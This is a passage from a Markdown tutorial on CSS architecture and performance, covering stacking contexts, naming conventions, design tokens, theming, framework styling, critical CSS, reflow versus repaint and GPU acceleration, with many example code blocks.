    transform: translateY(0);
  }
}

.scroll-animation {
  animation: fade-in-on-scroll 0.6s ease-out;
  animation-timeline: scroll(root);
}
```

### Z-Index and Stacking Context

```css
/* Stacking context creation */
.stacking-context {
  /* These properties create new stacking contexts */
  position: relative;
  z-index: 1;

  /* Or */
  opacity: 0.99;

  /* Or */
  transform: translateZ(0);

  /* Or */
  filter: blur(0px);

  /* Or */
  isolation: isolate;
}

/* Proper z-index management */
.z-index-scale {
  --z-dropdown: 1000;
  --z-sticky: 1020;
  --z-fixed: 1030;
  --z-modal-backdrop: 1040;
  --z-modal: 1050;
  --z-popover: 1060;
  --z-tooltip: 1070;
}

.dropdown {
  z-index: var(--z-dropdown);
}
.sticky {
  z-index: var(--z-sticky);
}
.fixed {
  z-index: var(--z-fixed);
}
.modal-backdrop {
  z-index: var(--z-modal-backdrop);
}
.modal {
  z-index: var(--z-modal);
}
.popover {
  z-index: var(--z-popover);
}
.tooltip {
  z-index: var(--z-tooltip);
}

/* Isolation for complex layouts */
.isolated-component {
  isolation: isolate; /* Creates new stacking context */
}

.isolated-component .child {
  /* z-index values are scoped to this component */
  z-index: 1; /* Only affects siblings within this component */
}
```

## 5. Architecture-Level Understanding

### CSS in Frontend Architecture

CSS architecture determines how styles scale across large applications and teams.

```
Frontend Architecture Layers:
├── Application Layer (React/Vue/Angular)
├── Component Layer (Reusable UI components)
├── Design System Layer (Design tokens, components)
├── CSS Architecture Layer (Organization methodology)
├── Build Layer (Compilers, optimizers)
└── Browser Layer (Rendering engine)

CSS Flow:
Component Styles → CSS Modules → Compiled CSS → Browser → Rendered UI
```

### Global vs Modular Styles

#### Global Styles

```css
/* global.css - Application-wide styles */
:root {
  /* Design tokens */
  --color-primary: #3b82f6;
  --color-secondary: #64748b;
  --spacing-unit: 0.25rem;
  --font-size-base: 1rem;
}

/* Base styles */
*,
*::before,
*::after {
  box-sizing: border-box;
}

html {
  font-size: 16px;
  line-height: 1.5;
  -webkit-text-size-adjust: 100%;
}

body {
  font-family:
    system-ui,
    -apple-system,
    sans-serif;
  color: var(--color-text);
  background: var(--color-background);
  margin: 0;
  padding: 0;
}

/* Utility classes */
.text-center {
  text-align: center;
}
.hidden {
  display: none;
}
.sr-only {
  /* Screen reader only */
  position: absolute;
  width: 1px;
  height: 1px;
  padding: 0;
  margin: -1px;
  overflow: hidden;
  clip: rect(0, 0, 0, 0);
  white-space: nowrap;
  border: 0;
}
```

#### Modular Styles

```css
/* components/Button.css - Component-specific styles */
.button {
  /* Base button styles */
  display: inline-flex;
  align-items: center;
  justify-content: center;
  padding: var(--spacing-md) var(--spacing-lg);
  border: none;
  border-radius: var(--border-radius-md);
  font-family: inherit;
  font-size: var(--font-size-base);
  font-weight: 500;
  text-decoration: none;
  cursor: pointer;
  transition: all 0.2s ease;
}

/* Button variants */
.button--primary {
  background: var(--color-primary);
  color: white;
}

.button--secondary {
  background: transparent;
  color: var(--color-primary);
  border: 2px solid var(--color-primary);
}

.button--large {
  padding: var(--spacing-lg) var(--spacing-xl);
  font-size: var(--font-size-lg);
}

.button--small {
  padding: var(--spacing-sm) var(--spacing-md);
  font-size: var(--font-size-sm);
}

/* Button states */
.button:hover {
  transform: translateY(-1px);
  box-shadow: var(--shadow-md);
}

.button:active {
  transform: translateY(0);
}

.button:disabled {
  opacity: 0.6;
  cursor: not-allowed;
  transform: none;
}
```

### Naming Conventions

#### BEM (Block Element Modifier)

```css
/* Block */
.card {
}

/* Elements */
.card__header {
}
.card__body {
}
.card__footer {
}
.card__image {
}
.card__title {
}
.card__description {
}

/* Modifiers */
.card--featured {
}
.card--large {
}
.card--dark {
}
.card--bordered {
}

/* Combined examples */
.card--featured .card__header {
  background: var(--color-primary);
  color: white;
}

.card--large .card__image {
  height: 300px;
}

/* Complex BEM */
.form {
}
.form__group {
}
.form__label {
}
.form__input {
}
.form__input--error {
}
.form__error-message {
}
.form__submit-button {
}
.form__submit-button--disabled {
}
```

#### Utility-First Approach

```css
/* Margin utilities */
.m-0 { margin: 0; }
.m-1 { margin: var(--spacing-1); }
.m-2 { margin: var(--spacing-2); }
.mt-4 { margin-top: var(--spacing-4); }
.mb-8 { margin-bottom: var(--spacing-8); }

/* Padding utilities */
.p-1 { padding: var(--spacing-1); }
.px-4 { padding-left: var(--spacing-4); padding-right: var(--spacing-4); }
.py-2 { padding-top: var(--spacing-2); padding-bottom: var(--spacing-2); }

/* Color utilities */
.text-primary { color: var(--color-primary); }
.bg-secondary { background: var(--color-secondary); }
.border-error { border-color: var(--color-error); }

/* Display utilities */
.block { display: block; }
.inline-block { display: inline-block; }
.flex { display: flex; }
.grid { display: grid; }
.hidden { display: none; }

/* Layout utilities */
.w-full { width: 100%; }
.h-screen { height: 100vh; }
.max-w-md { max-width: 28rem; }
.container {
  max-width: 1200px;
  margin: 0 auto;
  padding: 0 1rem;
}

/* Usage in HTML */
<div class="bg-white p-6 rounded-lg shadow-md">
  <h2 class="text-2xl font-bold text-primary mb-4">Card Title</h2>
  <p class="text-gray-600 mb-4">Card content goes here.</p>
  <button class="bg-primary text-white px-4 py-2 rounded hover:bg-primary-dark">
    Action Button
  </button>
</div>
```

### CSS Modules

```css
/* Button.module.css */
.button {
  composes: base from './base.module.css';
  padding: var(--spacing-md) var(--spacing-lg);
  border: none;
  border-radius: var(--border-radius-md);
  cursor: pointer;
  transition: all 0.2s ease;
}

.primary {
  composes: button;
  background: var(--color-primary);
  color: white;
}

.secondary {
  composes: button;
  background: transparent;
  border: 2px solid var(--color-primary);
  color: var(--color-primary);
}

/* Usage in React */
import styles from './Button.module.css';

function Button({ variant, children }) {
  return (
    <button className={styles[variant]}>
      {children}
    </button>
  );
}
```

### Design Systems

#### Design Tokens

```css
/* tokens/size.css */
:root {
  /* Spacing scale */
  --space-0: 0;
  --space-1: 0.25rem; /* 4px */
  --space-2: 0.5rem; /* 8px */
  --space-3: 0.75rem; /* 12px */
  --space-4: 1rem; /* 16px */
  --space-5: 1.25rem; /* 20px */
  --space-6: 1.5rem; /* 24px */
  --space-8: 2rem; /* 32px */
  --space-10: 2.5rem; /* 40px */
  --space-12: 3rem; /* 48px */
  --space-16: 4rem; /* 64px */
  --space-20: 5rem; /* 80px */
  --space-24: 6rem; /* 96px */

  /* Font sizes */
  --text-xs: 0.75rem; /* 12px */
  --text-sm: 0.875rem; /* 14px */
  --text-base: 1rem; /* 16px */
  --text-lg: 1.125rem; /* 18px */
  --text-xl: 1.25rem; /* 20px */
  --text-2xl: 1.5rem; /* 24px */
  --text-3xl: 1.875rem; /* 30px */
  --text-4xl: 2.25rem; /* 36px */
  --text-5xl: 3rem; /* 48px */

  /* Border radius */
  --radius-none: 0;
  --radius-sm: 0.125rem; /* 2px */
  --radius-base: 0.25rem; /* 4px */
  --radius-md: 0.375rem; /* 6px */
  --radius-lg: 0.5rem; /* 8px */
  --radius-xl: 0.75rem; /* 12px */
  --radius-2xl: 1rem; /* 16px */
  --radius-full: 9999px;
}

/* tokens/color.css */
:root {
  /* Primary palette */
  --color-primary-50: #eff6ff;
  --color-primary-100: #dbeafe;
  --color-primary-200: #bfdbfe;
  --color-primary-300: #93c5fd;
  --color-primary-400: #60a5fa;
  --color-primary-500: #3b82f6; /* Main primary */
  --color-primary-600: #2563eb;
  --color-primary-700: #1d4ed8;
  --color-primary-800: #1e40af;
  --color-primary-900: #1e3a8a;

  /* Semantic colors */
  --color-success: #10b981;
  --color-warning: #f59e0b;
  --color-error: #ef4444;
  --color-info: #3b82f6;

  /* Neutral palette */
  --color-gray-50: #f9fafb;
  --color-gray-100: #f3f4f6;
  --color-gray-200: #e5e7eb;
  --color-gray-300: #d1d5db;
  --color-gray-400: #9ca3af;
  --color-gray-500: #6b7280;
  --color-gray-600: #4b5563;
  --color-gray-700: #374151;
  --color-gray-800: #1f2937;
  --color-gray-900: #111827;
}
```

#### Component Library

```css
/* components/Button.css */
.button {
  /* Base styles using design tokens */
  padding: var(--space-3) var(--space-6);
  border: none;
  border-radius: var(--radius-md);
  font-family: inherit;
  font-size: var(--text-base);
  font-weight: 500;
  line-height: 1;
  cursor: pointer;
  transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
  display: inline-flex;
  align-items: center;
  justify-content: center;
  gap: var(--space-2);
}

/* Size variants */
.button--sm {
  padding: var(--space-2) var(--space-4);
  font-size: var(--text-sm);
}

.button--lg {
  padding: var(--space-4) var(--space-8);
  font-size: var(--text-lg);
}

.button--xl {
  padding: var(--space-5) var(--space-10);
  font-size: var(--text-xl);
}

/* Style variants */
.button--primary {
  background: var(--color-primary-500);
  color: white;
}

.button--primary:hover {
  background: var(--color-primary-600);
}

.button--secondary {
  background: transparent;
  color: var(--color-primary-500);
  border: 2px solid var(--color-primary-500);
}

.button--secondary:hover {
  background: var(--color-primary-500);
  color: white;
}

.button--outline {
  background: transparent;
  border: 2px solid var(--color-gray-300);
  color: var(--color-gray-700);
}

.button--outline:hover {
  background: var(--color-gray-50);
}

/* State variants */
.button--disabled {
  opacity: 0.6;
  cursor: not-allowed;
  pointer-events: none;
}

.button--loading {
  color: transparent;
  position: relative;
}

.button--loading::after {
  content: "";
  position: absolute;
  top: 50%;
  left: 50%;
  width: 1em;
  height: 1em;
  margin: -0.5em 0 0 -0.5em;
  border: 2px solid currentColor;
  border-radius: 50%;
  border-top-color: transparent;
  animation: spin 0.6s linear infinite;
}

@keyframes spin {
  to {
    transform: rotate(360deg);
  }
}
```

### Theming Architecture

#### CSS Custom Properties for Theming

```css
/* themes/base.css */
:root {
  /* Light theme (default) */
  --bg-primary: #ffffff;
  --bg-secondary: #f8fafc;
  --bg-tertiary: #f1f5f9;

  --text-primary: #1e293b;
  --text-secondary: #475569;
  --text-tertiary: #64748b;
  --text-inverse: #ffffff;

  --border-primary: #e2e8f0;
  --border-secondary: #cbd5e1;

  --shadow-sm: 0 1px 2px rgba(0, 0, 0, 0.05);
  --shadow-md: 0 4px 6px rgba(0, 0, 0, 0.07);
  --shadow-lg: 0 10px 15px rgba(0, 0, 0, 0.1);

  --accent-primary: #3b82f6;
  --accent-primary-hover: #2563eb;
}

/* Dark theme */
[data-theme="dark"] {
  --bg-primary: #0f172a;
  --bg-secondary: #1e293b;
  --bg-tertiary: #334155;

  --text-primary: #f8fafc;
  --text-secondary: #e2e8f0;
  --text-tertiary: #cbd5e1;
  --text-inverse: #0f172a;

  --border-primary: #334155;
  --border-secondary: #475569;

  --shadow-sm: 0 1px 2px rgba(0, 0, 0, 0.3);
  --shadow-md: 0 4px 6px rgba(0, 0, 0, 0.4);
  --shadow-lg: 0 10px 15px rgba(0, 0, 0, 0.5);

  --accent-primary: #60a5fa;
  --accent-primary-hover: #3b82f6;
}

/* High contrast theme */
[data-theme="high-contrast"] {
  --bg-primary: #000000;
  --bg-secondary: #1a1a1a;
  --text-primary: #ffffff;
  --text-secondary: #cccccc;
  --border-primary: #ffffff;
  --accent-primary: #0066cc;
}

/* Component using theme variables */
.card {
  background: var(--bg-primary);
  color: var(--text-primary);
  border: 1px solid var(--border-primary);
  box-shadow: var(--shadow-md);
  border-radius: var(--radius-lg);
  padding: var(--space-6);
}

.card__title {
  color: var(--text-primary);
  font-size: var(--text-xl);
  font-weight: 600;
  margin-bottom: var(--space-3);
}

.card__content {
  color: var(--text-secondary);
  line-height: 1.6;
}
```

#### Theme Switching Implementation

```css
/* Theme switcher component */
.theme-switcher {
  position: relative;
  display: inline-flex;
  align-items: center;
  gap: var(--space-2);
}

.theme-switcher__toggle {
  position: relative;
  width: 3rem;
  height: 1.5rem;
  background: var(--border-primary);
  border-radius: var(--radius-full);
  cursor: pointer;
  transition: background 0.3s ease;
}

.theme-switcher__toggle::after {
  content: "";
  position: absolute;
  top: 2px;
  left: 2px;
  width: 1.25rem;
  height: 1.25rem;
  background: white;
  border-radius: 50%;
  transition: transform 0.3s ease;
  box-shadow: var(--shadow-sm);
}

[data-theme="dark"] .theme-switcher__toggle::after {
  transform: translateX(1.5rem);
}

[data-theme="dark"] .theme-switcher__toggle {
  background: var(--accent-primary);
}

/* Theme icons */
.theme-switcher__icon {
  width: 1.25rem;
  height: 1.25rem;
  transition: opacity 0.3s ease;
}

.theme-switcher__icon--light {
  opacity: 1;
}

.theme-switcher__icon--dark {
  opacity: 0.3;
}

[data-theme="dark"] .theme-switcher__icon--light {
  opacity: 0.3;
}

[data-theme="dark"] .theme-switcher__icon--dark {
  opacity: 1;
}
```

### CSS in Framework Ecosystems

#### CSS-in-JS (Styled Components)

```javascript
// Styled Components example
import styled, { ThemeProvider } from "styled-components";

const Button = styled.button`
  padding: ${(props) => props.theme.space[3]} ${(props) => props.theme.space[6]};
  background: ${(props) => props.theme.colors.primary};
  color: white;
  border: none;
  border-radius: ${(props) => props.theme.radii.md};
  font-size: ${(props) => props.theme.fontSizes.base};
  cursor: pointer;
  transition: all 0.2s ease;

  &:hover {
    background: ${(props) => props.theme.colors.primaryDark};
    transform: translateY(-1px);
  }

  ${(props) =>
    props.variant === "outline" &&
    `
    background: transparent;
    border: 2px solid ${props.theme.colors.primary};
    color: ${props.theme.colors.primary};
    
    &:hover {
      background: ${props.theme.colors.primary};
      color: white;
    }
  `}
`;

// Usage with theme
const theme = {
  colors: {
    primary: "#3b82f6",
    primaryDark: "#2563eb",
  },
  space: [0, "0.25rem", "0.5rem", "1rem", "1.5rem"],
  radii: {
    md: "0.375rem",
  },
  fontSizes: {
    base: "1rem",
  },
};

function App() {
  return (
    <ThemeProvider theme={theme}>
      <Button variant="outline">Click me</Button>
    </ThemeProvider>
  );
}
```

#### CSS Modules in React

```javascript
// Card.module.css
.card {
  background: var(--bg-primary);
  border: 1px solid var(--border-primary);
  border-radius: var(--radius-lg);
  padding: var(--space-6);
  box-shadow: var(--shadow-md);
  transition: transform 0.2s ease;
}

.card:hover {
  transform: translateY(-2px);
}

.card__header {
  display: flex;
  align-items: center;
  justify-content: space-between;
  margin-bottom: var(--space-4);
}

.card__title {
  font-size: var(--text-xl);
  font-weight: 600;
  color: var(--text-primary);
}

// Card.jsx
import styles from './Card.module.css';

function Card({ title, children, actions }) {
  return (
    <div className={styles.card}>
      <div className={styles.card__header}>
        <h3 className={styles.card__title}>{title}</h3>
        {actions}
      </div>
      <div className={styles.card__content}>
        {children}
      </div>
    </div>
  );
}
```

#### Vue Scoped CSS

```vue
<!-- Card.vue -->
<template>
  <div class="card">
    <div class="card__header">
      <h3 class="card__title">{{ title }}</h3>
      <div class="card__actions">
        <slot name="actions"></slot>
      </div>
    </div>
    <div class="card__content">
      <slot></slot>
    </div>
  </div>
</template>

<style scoped>
.card {
  background: var(--bg-primary);
  border: 1px solid var(--border-primary);
  border-radius: var(--radius-lg);
  padding: var(--space-6);
  box-shadow: var(--shadow-md);
  transition: transform 0.2s ease;
}

.card:hover {
  transform: translateY(-2px);
}

.card__header {
  display: flex;
  align-items: center;
  justify-content: space-between;
  margin-bottom: var(--space-4);
}

.card__title {
  font-size: var(--text-xl);
  font-weight: 600;
  color: var(--text-primary);
}
</style>
```

### Micro-frontend Styling

#### Shadow DOM Encapsulation

```javascript
// Web Component with Shadow DOM
class MicroCard extends HTMLElement {
  constructor() {
    super();
    this.attachShadow({ mode: "open" });
  }

  connectedCallback() {
    this.shadowRoot.innerHTML = `
      <style>
        :host {
          display: block;
          background: var(--bg-primary, #ffffff);
          border: 1px solid var(--border-primary, #e2e8f0);
          border-radius: var(--radius-lg, 0.5rem);
          padding: var(--space-6, 1.5rem);
          box-shadow: var(--shadow-md, 0 4px 6px rgba(0, 0, 0, 0.1));
        }
        
        .title {
          font-size: var(--text-xl, 1.25rem);
          font-weight: 600;
          color: var(--text-primary, #1e293b);
          margin-bottom: var(--space-3, 0.75rem);
        }
        
        .content {
          color: var(--text-secondary, #475569);
          line-height: 1.6;
        }
      </style>
      
      <div class="title">${this.getAttribute("title")}</div>
      <div class="content">
        <slot></slot>
      </div>
    `;
  }
}

customElements.define("micro-card", MicroCard);
```

#### CSS Namespace Strategy

```css
/* Micro-frontend namespace approach */
.mfe-app-1 .button {
  /* App 1 button styles */
}
.mfe-app-2 .button {
  /* App 2 button styles */
}

/* Shared design system */
.design-system .button {
  /* Base button styles */
}
.design-system .button--primary {
  /* Primary variant */
}

/* Container query approach for isolation */
.mfe-container {
  container-type: inline-size;
}

@container (min-width: 768px) {
  .mfe-component {
    /* Responsive styles within container */
  }
}
```

## 6. Performance & Optimization

### Critical CSS

Critical CSS is the minimal CSS required to render above-the-fold content.

```css
/* critical.css - Inline in HTML */
/* Above-the-fold styles only */
.header {
  background: var(--bg-primary);
  padding: var(--space-4) 0;
  position: sticky;
  top: 0;
  z-index: 100;
}

.hero {
  min-height: 80vh;
  display: flex;
  align-items: center;
  justify-content: center;
  background: linear-gradient(
    135deg,
    var(--color-primary),
    var(--color-secondary)
  );
  color: white;
  text-align: center;
}

.hero__title {
  font-size: clamp(2rem, 5vw, 4rem);
  font-weight: 700;
  margin-bottom: var(--space-4);
}

.hero__button {
  background: white;
  color: var(--color-primary);
  padding: var(--space-3) var(--space-6);
  border: none;
  border-radius: var(--radius-md);
  font-size: var(--text-lg);
  font-weight: 600;
  cursor: pointer;
  transition: all 0.2s ease;
}

/* Non-critical styles loaded separately */
/* styles.css - Loaded asynchronously */
.footer {
  /* Below-the-fold styles */
}
.sidebar {
  /* Hidden initially */
}
.modal {
  /* Interactive components */
}
```

### Minimizing Reflow & Repaint

#### Performance-Optimized Animations

```css
/* Use transform and opacity for smooth animations */
.performant-animation {
  /* Good - GPU accelerated */
  transform: translateX(100px);
  opacity: 0.5;

  /* Bad - triggers layout */
  left: 100px;
  width: 200px;
  top: 50px;
  height: 100px;
}

/* GPU acceleration hints */
.gpu-accelerated {
  will-change: transform, opacity;
  transform: translateZ(0); /* Force GPU layer */
  backface-visibility: hidden;
}

/* Contain paint for complex components */
.isolated-component {
  contain: paint; /* Limit repaint to component */
}

/* Layout containment */
.layout-contained {
  contain: layout; /* Prevent layout effects outside */
}
```

#### Batch DOM Reads and Writes

```css
/* CSS that minimizes layout thrashing */
.batched-updates {
  /* Use CSS classes instead of inline styles */
  transition: all 0.3s ease;
}

.batched-updates.is-active {
  transform: scale(1.1);
  opacity: 0.8;
  background: var(--color-primary);
}

/* Avoid layout-dependent properties */
.layout-friendly {
  /* Use transform instead of changing position */
  transform: translateY(20px); /* Good */
  /* top: 20px; */ /* Bad - triggers layout */

  /* Use width/height with care */
  width: 200px; /* May trigger layout */
  max-width: 200px; /* Better - less layout impact */
}
```

### Reducing CSS Bloat

#### Tree Shaking Unused CSS

```css
/* PurgeCSS-friendly structure */
.used-styles {
  /* These will be kept */
  color: var(--text-primary);
  background: var(--bg-primary);
}

.unused-styles {
  /* These will be removed if not used in HTML */
  color: red;
  background: blue;
}

/* Dynamic classes that might be removed */
.dynamic-class-1 {
}
.dynamic-class-2 {
}
.dynamic-class-3 {
}

/* Safelist patterns for PurgeCSS */
/* purgedcss ignore current */
.important-class {
}
/* purgedcss ignore start */
.ignore-start {
}
.ignore-end {
}
/* purgedcss ignore end */
```

#### CSS Optimization Techniques

```css
/* Efficient selectors */
.efficient {
  /* Good - class-based */
  .card {
  }

  /* Bad - overly specific */
  .container .main .content .card {
  }

  /* Bad - universal selector */
  * {
  }

  /* Bad - tag selector with class */
  div.card {
  }
}

/* Minimize rule complexity */
.optimized {
  /* Good - focused properties */
  .button-primary {
    background: var(--color-primary);
    color: white;
    padding: var(--space-3) var(--space-6);
  }

  /* Bad - too many properties */
  .button-primary {
    background: var(--color-primary);
    color: white;
    padding: var(--space-3) var(--space-6);
    margin: 0;
    border: none;
    outline: none;
    font-family: inherit;
    font-size: inherit;
    font-weight: inherit;
    line-height: inherit;
    text-align: inherit;
    text-decoration: inherit;
    cursor: pointer;
    /* ... many more properties */
  }
}
```

### CSS Delivery Optimization

#### Loading Strategies

```html
<!-- Critical CSS inline -->
<style>
  /* Critical above-the-fold styles */
  .hero {
    min-height: 80vh;
  }
  .header {
    position: sticky;
  }
</style>

<!-- Non-critical CSS loaded asynchronously -->
<link
  rel="preload"
  href="styles.css"
  as="style"
  onload="this.onload=null;this.rel='stylesheet'"
/>
<noscript><link rel="stylesheet" href="styles.css" /></noscript>

<!-- Media-specific loading -->
<link rel="stylesheet" href="print.css" media="print" />
<link rel="stylesheet" href="mobile.css" media="(max-width: 768px)" />

<!-- Font loading strategy -->
<link
  rel="preload"
  href="fonts/inter.woff2"
  as="font"
  type="font/woff2"
  crossorigin
/>
```

#### CSS Compression and Minification

```css
/* Before minification */
.compressed-example {
  background-color: #ffffff;
  padding-top: 1rem;
  padding-right: 1rem;
  padding-bottom: 1rem;
  padding-left: 1rem;
  margin-top: 0;
  margin-bottom: 2rem;
  border-radius: 0.5rem;
  box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
}

/* After minification */
.compressed-example {
  background: #fff;
  padding: 1rem;
  margin: 0 0 2rem;
  border-radius: 0.5rem;
  box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
}

/* Optimized for compression */
.optimized-for-gzip {
  /* Use consistent property order */
  /* Use shorthand properties */
  /* Group related selectors */
  /* Use consistent naming */
}
```

### Caching Strategies

#### Cache-Friendly CSS Architecture

```css
/* versioned.css - Changes infrequently */
.versioned-styles {
  /* Base styles, reset, typography */
  /* Cache for long periods */
}

/* hash.css - Changes frequently */
.frequently-updated {
  /* Component-specific styles */
  /* Cache for short periods */
}

/* File naming strategy */
/* styles.1a2b3c.css - Content hash */
/* critical.css - Never cached */
/* vendor.a1b2c3.css - Vendor libraries */
```

### Impact of Large Selectors

#### Selector Performance Analysis

```css
/* Performance impact (high to low) */
.performance-analysis {
  /* 1. Universal selector - Slowest */
  * {
  }

  /* 2. Tag selectors */
  div {
  }
  p {
  }

  /* 3. Attribute selectors */
  [type="text"] {
  }

  /* 4. Pseudo-classes */
  :hover {
  }
  :first-child {
  }

  /* 5. Class selectors - Fastest */
  .class-name {
  }

  /* 6. ID selectors - Fastest */
  #id-name {
  }
}

/* Efficient selector patterns */
.efficient-selectors {
  /* Good - simple class selectors */
  .button {
  }
  .card {
  }

  /* Good - specific class combinations */
  .button.primary {
  }
  .card.featured {
  }

  /* Bad - complex selectors */
  .container .main .content .section .card .title {
  }
  .nav ul li a span.icon {
  }

  /* Bad - tag + class */
  div.card {
  }
  button.button {
  }
}
```

### Rendering Pipeline Optimization

```
Browser Rendering Pipeline:
1. Parse HTML → DOM Tree
2. Parse CSS → CSSOM Tree
3. Combine → Render Tree
4. Layout → Calculate positions
5. Paint → Draw pixels
6. Composite → Combine layers

Optimization Points:
├── Minimize DOM size
├── Reduce CSS complexity
├── Avoid layout thrashing
├── Use GPU acceleration
└── Optimize paint operations
```

```css
/* Layout optimization */
.layout-optimized {
  /* Use contain property */
  contain: layout style paint;

  /* Avoid layout-dependent properties during animations */
  transform: translateX(100px); /* Good */
  /* left: 100px; */ /* Bad */

  /* Use fixed dimensions when possible */
  width: 200px;
  height: 100px;
}

/* Paint optimization */
.paint-optimized {
  /* Use opacity and transform for animations */
  opacity: 0.5;
  transform: scale(1.1);

  /* Avoid expensive properties */
  /* box-shadow: 0 10px 30px rgba(0,0,0,0.3); */ /* Expensive */
  /* filter: blur(5px); */ /* Very expensive */

  /* Use will-change sparingly */
  will-change: transform; /* Good for animating elements */
}

/* Composite optimization */
.composite-optimized {
  /* Create new layers for animated elements */
  transform: translateZ(0);
  backface-visibility: hidden;

  /* Reduce layer count */
  /* Avoid unnecessary transforms */
  /* Group animated elements */
}
```

---

_Sections 4-6 complete. This section covers advanced CSS capabilities, architectural patterns for large-scale applications, and performance optimization techniques used in production systems. Each topic includes practical examples and best practices for building maintainable, performant CSS architectures._

## 7. Browser Internals & Rendering

### How Browser Reads CSS

Understanding the browser's CSS parsing process is crucial for optimization.

```
CSS Processing Pipeline:
1. Download CSS Files
2. Parse CSS → CSSOM (CSS Object Model)
3. Combine with DOM → Render Tree
4. Calculate Styles (Resolve conflicts)
5. Layout (Reflow)
6. Paint (Repaint)
7. Composite Layers

Critical Path:
├── HTML Parser → DOM Tree
├── CSS Parser → CSSOM Tree
├── Attachment → Render Tree
└── Rendering → Visual Output
```

#### CSSOM Construction

```css
/* Browser builds CSSOM like this */
/* Input CSS */
body { font-size: 16px; color: #333; }
p { color: #666; line-height: 1.5; }
.highlight { background: yellow; }

/* CSSOM Structure (simplified) */
CSSOM {
  body: {
    fontSize: "16px",
    color: "#333"
  },
  p: {
    color: "#666",      /* Inherits from body if not specified */
    lineHeight: "1.5"
  },
  highlight: {
    background: "yellow"
  }
}
```

#### Render Tree Construction

```javascript
// Render Tree combines DOM and CSSOM
// Only visible elements are included
// display: none elements are excluded

DOM Element + CSS Styles = Render Node

Example:
<div class="card">
  <h2>Title</h2>
  <p>Content</p>
</div>

Render Tree:
├── div.card (styles applied)
├── h2 (styles applied)
└── p (styles applied)
```

### Reflow vs Repaint

Understanding the difference between reflow and repaint is key to performance optimization.

#### Reflow (Layout)

Reflow occurs when the browser needs to recalculate the positions and dimensions of elements.

```css
/* Properties that trigger reflow */
.reflow-triggers {
  /* Layout properties */
  width: 200px; /* Triggers reflow */
  height: 100px; /* Triggers reflow */
  padding: 10px; /* Triggers reflow */
  margin: 20px; /* Triggers reflow */
  border: 1px solid; /* Triggers reflow */

  /* Positioning */
  top: 10px; /* Triggers reflow */
  left: 20px; /* Triggers reflow */
  position: absolute; /* Triggers reflow */

  /* Font changes */
  font-size: 16px; /* Triggers reflow */
  font-family: Arial; /* Triggers reflow */
  line-height: 1.5; /* Triggers reflow */

  /* Display changes */
  display: block; /* Triggers reflow */
  float: left; /* Triggers reflow */
  clear: both; /* Triggers reflow */
}
```

#### Repaint (Paint)

Repaint occurs when the browser needs to redraw elements without changing layout.

```css
/* Properties that trigger repaint only */
.repaint-triggers {
  /* Visual properties */
  color: blue; /* Repaint only */
  background: red; /* Repaint only */
  border-color: green; /* Repaint only */
  outline: 2px solid; /* Repaint only */

  /* Shadow effects */
  box-shadow: 0 2px 4px; /* Repaint only */
  text-shadow: 1px 1px; /* Repaint only */

  /* Transform and opacity (GPU accelerated) */
  transform: translateX(10px); /* Composite only */
  opacity: 0.5; /* Composite only */
}
```

#### Performance Impact Analysis

```javascript
// Layout thrashing example (BAD)
function badPerformance() {
  // Read → Write → Read → Write pattern causes multiple reflows
  const element1 = document.getElementById("el1");
  const element2 = document.getElementById("el2");

  // Read (triggers reflow)
  const width1 = element1.offsetWidth;

  // Write (triggers reflow)
  element1.style.width = width1 + 10 + "px";

  // Read (triggers another reflow)
  const width2 = element2.offsetWidth;

  // Write (triggers another reflow)
  element2.style.width = width2 + 10 + "px";
}

// Optimized version (GOOD)
function goodPerformance() {
  const element1 = document.getElementById("el1");
  const element2 = document.getElementById("el2");

  // Batch all reads first
  const width1 = element1.offsetWidth;
  const width2 = element2.offsetWidth;

  // Batch all writes
  element1.style.width = width1 + 10 + "px";
  element2.style.width = width2 + 10 + "px";
}
```

### GPU Acceleration

Modern browsers use GPU acceleration for certain CSS properties to improve performance.

#### GPU-Accelerated Properties

```css
/* Properties that trigger GPU acceleration */
.gpu-accelerated {
  /* Transform properties */
  transform: translateX(100px);
  transform: translateY(50px);
  transform: scale(1.2);
  transform: rotate(45deg);
  transform: translate3d(0, 0, 0);

  /* Opacity */
  opacity: 0.5;

  /* Filters */
  filter: blur(5px);
  filter: brightness(1.2);

  /* Will-change hint */
  will-change: transform, opacity;
}
```

#### Creating GPU Layers

```css
/* Force GPU layer creation */
.gpu-layer {
  /* Method 1: Transform */
  transform: translateZ(0);

  /* Method 2: Transform 3d */
  transform: translate3d(0, 0, 0);

  /* Method 3: Backface visibility */
  backface-visibility: hidden;

  /* Method 4: Will-change */
  will-change: transform;

  /* Method 5: Opacity (less than 1) */
  opacity: 0.99;
}

/* Be careful with too many layers */
.too-many-layers {
  /* Each of these creates a new GPU layer */
  transform: translateZ(0); /* Layer 1 */
  will-change: transform; /* Layer 2 */
  opacity: 0.99; /* Layer 3 */
  /* Can cause memory issues on mobile */
}
```

#### GPU Acceleration Best Practices

```css
/* Good practices for GPU acceleration */
.optimized-animations {
  /* Use transform for position changes */
  transform: translateX(100px); /* Good */
  /* left: 100px; */ /* Bad - triggers layout */

  /* Use opacity for visibility changes */
  opacity: 0; /* Good */
  /* visibility: hidden; */ /* Bad - triggers layout */

  /* Use will-change sparingly */
  will-change: transform; /* Good for animating elements */

  /* Remove will-change after animation */
  .animation-complete {
    will-change: auto; /* Clean up GPU resources */
  }
}

/* Avoid common GPU acceleration pitfalls */
.gpu-pitfalls {
  /* Don't accelerate everything */
  * {
    transform: translateZ(0);
  } /* BAD - too many layers */

  /* Don't use will-change on too many elements */
  .list-item {
    will-change: transform;
  } /* BAD for long lists */

  /* Don't forget to clean up */
  .animated-element {
    will-change: transform;
    transform: translateX(100px);
  }
  /* Missing will-change: auto after animation */
}
```

### Animation Performance

Different CSS properties have different performance characteristics.

#### Performance Hierarchy (Best to Worst)

```css
/* Best Performance - Composite only */
.best-performance {
  transform: translateX(100px); /* 60fps capable */
  transform: scale(1.2); /* 60fps capable */
  opacity: 0.5; /* 60fps capable */
}

/* Good Performance - Paint only */
.good-performance {
  color: blue; /* Usually 60fps */
  background: red; /* Usually 60fps */
  box-shadow: 0 2px 4px; /* Usually 60fps */
}

/* Poor Performance - Layout required */
.poor-performance {
  width: 200px; /* May drop frames */
  height: 100px; /* May drop frames */
  left: 50px; /* May drop frames */
  top: 20px; /* May drop frames */
}

/* Worst Performance - Expensive operations */
.worst-performance {
  box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5); /* Very expensive */
  filter: blur(10px); /* Very expensive */
  border-radius: 50%; /* Expensive */
}
```

#### Animation Optimization Techniques

```css
